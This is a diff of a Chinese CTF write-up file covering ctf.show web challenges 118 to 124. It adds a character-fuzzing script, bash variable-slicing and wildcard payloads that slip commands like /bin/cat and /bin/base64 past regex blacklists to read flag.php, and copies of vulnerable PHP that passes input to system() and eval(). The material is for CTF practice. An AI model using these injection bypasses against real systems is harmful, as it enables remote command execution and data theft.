@@ -7194,15 +7194,300 @@ $ffi->system($a);//通过$ffi去调用system函数
 
 ### ctf\_show web118 。。。。
 
-ctf\_show web118
+![image-20220819151718181](CTF刷题WriteUp.assets/image-20220819151718181.png)
 
-ctf\_show web118
+注释发现：
 
-ctf\_show web118
+![image-20220819151811829](CTF刷题WriteUp.assets/image-20220819151811829.png)
 
-ctf\_show web118
+源码提示system执行输入的参数,发现会显示evil input
 
-ctf\_show web118
+ 临时写的fuzz脚本测试未过滤的字符
+
+~~~python
+import  string
+import requests
+
+
+payload = string.digits+string.ascii_letters+"{}+_!@#$%^*().|\\/ ?<>"
+url = "http://73ae9e45-d47a-4c59-822a-daf2156a180c.challenge.ctf.show/"
+white_list = ""
+for str in payload:
+    data = {'code':str}
+    html_res = requests.post(url=url,data=data)
+    if "evil input" in html_res.text:
+       continue
+
+    else:
+        white_list = white_list+str
+        print(white_list)
+print("\n白名单为： "+white_list.replace(" ","空格"))
+
+~~~
+
+**结果为：**
+
+> 白名单为： ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_@#$.空格?
+>
+> $ 花括号和大写字母未被过滤
+
+拿$PWD举例
+
+~~~
+$PWD和${PWD}    /var/www/html  结果一样
+${#PWD}         13    $PWD的长度
+${PWD:3}        r/www/html    截取第4个字符串之后的内容
+${PWD:~3}    	html    截取后面的4个字符串的内容
+${PWD:3:1}     	r  截取第4个字符串之后的内容，长度为1
+${PWD:~3:1} 	h	截取后面的4个字符串的内容，长度为1
+${SHLVL:~A} 	1	    A是字符串 转换为数字相当于0   
+~~~
+
+拼接出nl
+
+~~~
+n:
+${PATH:~A}  	n #如果$PATH结尾为n
+${PATH:${#TERM}:${SHLVL:~A}}   # n   相当于${PATH:14:1}
+l:
+${#RANDOM}  # 4或者5
+${PATH:${#RANDOM}:${#SHLVL:~A}}  #l
+
+
+
+~~~
+
+
+
+payload:
+
+~~~
+code=${PATH:~A}${PATH:${#RANDOM}:${#SHLVL:~A}} ????.???
+~~~
+
+
+
+![image-20220819165315048](CTF刷题WriteUp.assets/image-20220819165315048.png)
+
+
+
+### ctf\_show web119
+
+![image-20220819165603533](CTF刷题WriteUp.assets/image-20220819165603533.png)
+
+继续使用上一关的FUZZ测试脚本  测试过滤了那些字符串
+
+> 白名单为： ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_@#$.空格?
+
+PATH不能用了
+
+可以拼接/bin/base64 或者/bin/cat
+
+~~~
+0:
+${#}
+1:
+${##}
+${#SHLVL}
+4-5:
+${#RANDOM}
+/:
+${HOME:${#}:${##}}
+t:
+${HOME:${#HOSTNAME}:${#SHLVL}}
+
+~~~
+
+
+
+~~~
+/bin/cat flag.php
+
+
+code=${HOME:${#}:${##}}???${HOME:${#}:${##}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???
+/bin/base64 flag.php
+code=${HOME:${#}:${##}}???${HOME:${#}:${##}}?????${#RANDOM} ????.???
+
+~~~
+
+![image-20220819171136266](CTF刷题WriteUp.assets/image-20220819171136266.png)
+
+
+
+
+
+### ctf\_show web120
+
+~~~php
+
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_POST['code'])){
+    $code=$_POST['code'];
+    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
+        if(strlen($code)>65){
+            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
+        }
+        else{
+        echo '<div align="center">'.system($code).'</div>';
+        }
+    }
+    else{
+     echo '<div align="center">evil input</div>';
+    }
+}
+
+?>
+
+
+~~~
+
+~~~
+${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
+~~~
+
+### ctf\_show web121
+
+~~~php
+
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_POST['code'])){
+    $code=$_POST['code'];
+    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
+        if(strlen($code)>65){
+            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
+        }
+        else{
+        echo '<div align="center">'.system($code).'</div>';
+        }
+    }
+    else{
+     echo '<div align="center">evil input</div>';
+    }
+}
+
+?>
+~~~
+
+发现过滤挺多的，不过还是可以拼接/bin/base64
+
+~~~
+/
+${PWD:${#}:${##}}
+4-5
+${#RANDOM}
+~~~
+
+payload:
+
+~~~
+code=${PWD:${#}:${##}}???${PWD:${#}:${##}}?????${#RANDOM} ????.???
+~~~
+
+![image-20220819173119942](CTF刷题WriteUp.assets/image-20220819173119942.png)
+
+
+
+### ctf\_show web122
+
+~~~php
+
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_POST['code'])){
+    $code=$_POST['code'];
+    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\>|\'|\"|\`|\||\,/', $code)){    
+        if(strlen($code)>65){
+            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
+        }
+        else{
+        echo '<div align="center">'.system($code).'</div>';
+        }
+    }
+    else{
+     echo '<div align="center">evil input</div>';
+    }
+}
+
+?>
+
+
+~~~
+
+```
+通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误
+```
+
+~~~
+code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
+~~~
+
+写个脚本多尝试几次
+
+~~~python
+import requests
+
+url = "http://73d7bce4-52af-42b3-a996-db70fecb389b.challenge.ctf.show/"
+
+data = {"code":"<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???"}
+
+
+for i in range(100):
+    html_res = requests.post(url, data)
+   
+    print(html_res.text)
+~~~
+
+
+
+### ctf\_show web124 。。。。
+
+~~~php
+ <?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: 收集自网络
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-06 14:04:45
+
+*/
+
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    show_source(__FILE__);
+}else{
+    //例子 c=20-1
+    $content = $_GET['c'];
+    if (strlen($content) >= 80) {
+        die("太长了不会算");
+    }
+    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match('/' . $blackitem . '/m', $content)) {
+            die("请不要输入奇奇怪怪的字符");
+        }
+    }
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
+    foreach ($used_funcs[0] as $func) {
+        if (!in_array($func, $whitelist)) {
+            die("请不要输入奇奇怪怪的函数");
+        }
+    }
+    //帮你算出答案
+    eval('echo '.$content.';');
+} 
+~~~
+
+
 
 ### ctf\_show web78
 
@@ -7811,3 +8096,6 @@ ctf\_show web153
 ctf\_show web153
 
 ctf\_show web153
+
+### ctf\_show web259
+
